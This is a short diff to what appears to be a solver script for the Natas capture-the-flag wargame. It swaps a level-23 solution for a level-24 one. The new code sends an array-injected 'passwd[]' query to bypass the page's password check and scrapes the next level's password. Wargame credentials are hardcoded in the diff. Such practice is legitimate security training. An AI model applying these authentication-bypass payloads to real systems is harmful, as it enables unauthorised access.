@@ -4,17 +4,15 @@ import re
 from time import sleep
 import requests
 
-def natas23():
-    username="natas23"
-    password = "D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE"
-    data = {"passwd":"11iloveyou"}
-    content = post_page(23, username, password, data=data)
+def natas24():
+    username="natas24"
+    password = "OsRmXFguozKpTZZ5X14zNO43379LZveg"
+    content = get_page(24, username, password, "?passwd[]=lol")
     password = re.search(r"(?<=Password: )\w{32}", content)
     if password is None:
         print("Fail to find password")
         return
     print(password.group(0))
     
-
 if __name__ == "__main__":
-    natas23()
+    natas24()
